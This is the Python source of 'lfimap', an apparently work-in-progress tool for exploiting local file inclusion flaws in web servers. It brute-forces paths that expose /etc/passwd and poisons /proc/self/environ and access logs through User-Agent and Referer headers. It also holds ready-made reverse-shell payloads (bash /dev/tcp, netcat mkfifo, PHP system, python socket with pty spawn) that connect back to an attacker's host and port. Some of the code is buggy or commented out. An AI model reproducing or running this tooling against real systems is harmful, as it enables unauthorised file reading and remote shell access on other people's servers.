#!/usr/bin/env python3
import os
import sys
import re
import subprocess
import requests
import requests.exceptions
import random
import argparse
import socket
import pyping
import core
from core import *

from argparse import RawTextHelpFormatter
from urllib.parse import urlsplit
from urllib.parse import urlparse
from collections import deque

def checkUrl(url):
    if(lhost):
        ipRegex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
        if(re.match(ipRegex, lhost) is None):
            return False
        return True

#Testing
def checkArgs(url, lhost, lport):
    #Checking url
    urlRegex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

    if(re.match(urlRegex, url) is None):
        print("URL not valid, exiting...")
        sys.exit(-1)

    #Checking localhost ip arg
    if(lhost):
        ipRegex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
        if(re.match(ipRegex, lhost) is None):
            print("LHOST IP " + lhost + " not valid, exiting...")
            sys.exit(-1)

    #Checking local port arg
    if(lport):
        if(lport < 1 or lport > 65534):
            print("LPORT " + str(lport) + " not valid, extiting...")
            sys.exit(-1)
#OK
def prepareHeaders():
    user_agents = [
                            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
                            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
                            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
                            "Mozilla/3.01 (Macintosh; PPC)",
                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
                            "Opera/8.00 (Windows NT 5.1; U; en)",
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                ]

    headers = {}
    headers['User-Agent'] = random.choice(user_agents)
    headers['Accept-Language'] = 'en-US;'
    headers['Accept-Encoding'] = 'gzip, deflate'
    headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;'
    headers['Connection'] = 'Close'

    return headers

#OK
def addHeader(newKey, newVal, headers):
    headers[newKey] = newVal

#Returns IP of specified URL
#TESTING
def urlToIpAddress(url):
    return socket.gethostbyname(url)

#Payload is selected
#Testing
def preparePayloads(payload):
    payloads = {}
    #TODO perl, ruby, java
    payloads['bashtcp'] = """bash -i >& /dev/tcp/{}/{} 0>&1""".format(lhost, lport)
    payloads['bashudp'] = """sh -i >& /dev/udp/{}/{} 0>&1""".format(lhost, lport)
    payloads['php'] = """<? system("/bin/bash -c 'bash -i >& /dev/tcp/"{}"/{} 0>&1'");?>""".format(lhost, lport)
    payloads['nc'] = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f""".format(lhost, lport)
    payloads['python'] = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""".format(lhost, lport)

    if(payload is not None):
        if(payload not in payloads):
            print("Payload not valid. Try tcp, udp, php, nc or python...")
            sys.exit(-1)
    else:
        # Use PHP as default payload method
        payload = 'php'

    return payloads[payload]

def exploitFinder(headers, os):
    if(cookie is not None):
        header = addHeader('Cookie', cookie, headers)
    
    f = open(wordlist, "r")
    
    for line in f:
        line = line[:-1]    
        res = requests.get(url+line, headers = headers)
        
        if("root:x:0:0" in res.text or ":www-data:" in res.text): 
                print(" [+] LFI -> " + url+line)                     
                exploit = url+line
                exploit = exploit.replace('//etc/passwd', '') #TODO Better and more elegant
                
                return exploit
        else:
            exploit = ""

    f.close()
    return exploit

def testParameterInclusion(param, lfiPath, headers):
    temp = headers
    testParam = '<?php (=!) ?>'

    addHeader(param, testParam, headers)
    res = requests.get(lfiPath, headers = headers)
    addHeader(param, temp[param], headers)

    if(testParam in res.text):
        return True
    
    return False

def exploit_self_environ(exploit, payload, headers):
    print("Trying to include /proc/self/environ ...")
    environ = '/proc/self/environ'

    #Test 'User-Agent' payload injection
    if(testParameterInclusion('User-Agent', exploit+environ, headers)):
        print("/proc/self/environ LFI using User-Agent")
        addHeader('User-Agent', payload, headers)
        requests.get(exploit+environ, headers = header)
        return

    #Try 'Referer' code injection
    if(testParameterInclusion('Referer', exploit+environ, headers)):
        print("/proc/self/environ LFI using Referer")
        addHeader('Referer', payload, headers)
        requests.get(exploit+environ, headers = header)
        return
    
    print("Not vulnerable")

def exploit_access_log_injection(exploit, payload, headers):
    addHeader('User-Agent', payload, headers)

    #Inject unencoded payload inside access.log
    requests.get(exploit+payload, headers = headers)

    f = open("access_log.txt", "r")
    for line in f:
            print("Testing URL ->" + exploit+line)
           
            #Execute payload
            res = requests.get(exploit+line, headers = headers)

#Testing
#Not working on all sites?
def web_banner_grabber(ip, port):
    x = requests.head(url)
    return (str(x.headers))

def detectOS():
    linux = ['Ubuntu', 'Debian', 'Fedora', 'Linux', 'Arch', 'Parrot', 'Kali', 'Suse', 'Cent', 'Red', 'Gecko', 'Manjaro', 'nux', 'Slack']
    windows = ['Windows', 'windows', 'IIS', 'iis', 'Microsoft', 'microsoft']

    if(verbose):
        print("Detecting OS version...")

    u = urlparse(url)
    port = u.port
    if(port is None):
        if('http://' in url):
            port = 80
        elif('https://' in url):
            port = 443

    #Convert url to IP address
    spltAr = url.split("://")
    i = (0,1)[len(spltAr)>1]
    ip = spltAr[i].split("?")[0].split('/')[0].split(':')[0].lower()

    banner = web_banner_grabber(str(ip), port)
    banner = ''.join(banner)
    print(banner)

    for l in linux:
        if(l in banner):
                if(verbose):
                    print("Target is probably running Linux")
                #return str("Linux")

    for w in windows:
            if(w in banner):
                if(verbose):
                    print("Target is probably running Windows")
                #return str("Windows")

    if('gws' in banner or 'GWS' in banner):
        if(verbose):
            print("Target is probably Google Web Server")
        #return str("GoogleWebServer")

    if('cloud' in banner or 'Cloud' in banner):
        if(verbose):
            print("Target is probably running on cloud")
        #return str("Cloud")

    r = pyping.ping(ip)
    print(r.ret_code)

def main():
    headers = prepareHeaders() #OK

    os = detectOS()
    #exploit = exploitFinder(headers, os) #Testing
    
    # If autoexploit is set, check if correct payload method is provided
    #if(autoexp):
        #payload = preparePayloads(args.payload)
                
        #exploit_self_environ(exploit, payload, headers) #TODO testirat 

    #END
    exit(0)

if(__name__ == "__main__"):
    
    parser = argparse.ArgumentParser(description="lfimap, for exploiting LFI", formatter_class=RawTextHelpFormatter, add_help=False)

    parser.add_argument('url', type=str, metavar="URL", help="\t\t Provide site url. Ex: http://example.com")
    parser.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Session cookie. Ex: "PHPSESSID=1943785348b45"')
    parser.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Custom wordlist (default wordlist.txt)")
    parser.add_argument('-p', type=str, metavar="<payload>", dest='payload', help="\t\t Payload type.Available: tcp, nc, bash, sh, python, ruby, perl, lua")
    parser.add_argument('-a', '--autoexploit', action="store_true", dest = 'autoexploit', help="\t\t Tries to send a reverse shell to provided lhost and lport.")
    parser.add_argument('-lh', type=str, metavar="<lhost>", dest='lhost', help="\t\t Localhost IP address. Use with -a, otherwise it has no effect")
    parser.add_argument('-lp', type=int, metavar="<lport>", dest='lport', help="\t\t Localhost PORT number. Use with -a, otherwise it has no effect")
    parser.add_argument('-v', '--verbose', action="store_true", dest = 'verbose', help = "\t\t Verbose output")
    parser.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\t Print this help message")

    #TODO implement tor proxy
    #TODO implement rotating proxy
    #TODO --proxy <IP>

    args = parser.parse_args()

    url = args.url
    autoexp = args.autoexploit
    lhost = args.lhost
    lport = args.lport
    cookie = args.cookie
    wordlist = args.wordlist
    payload = args.payload

    #TODO Implement logger instead of verbose arg
    verbose = args.verbose

    #Check if autoexploiting is on. If yes, make sure lhost and lport are entered for rev. shell
    if(autoexp):
        if(lhost is None):    
            if(verbose):
                print("Localhost IP (-lh) argument is not provided")                       
            lhost = input('Enter localhost IP: ')
        if(lport is None):
            if(verbose):
                print("Local port (-lp) argument is not provided")  
            lport = int(input('Enter localport number: '))

    #If wordlist is not provided, use default (wordlist.txt)
    if(wordlist is None):
        wordlist = "wordlist.txt"

    #TODO check if wordlist provided exists as a file
    #TODO check if payload is available
    #TODO check if cookie is valid
    checkArgs(url, lhost, lport)

    main()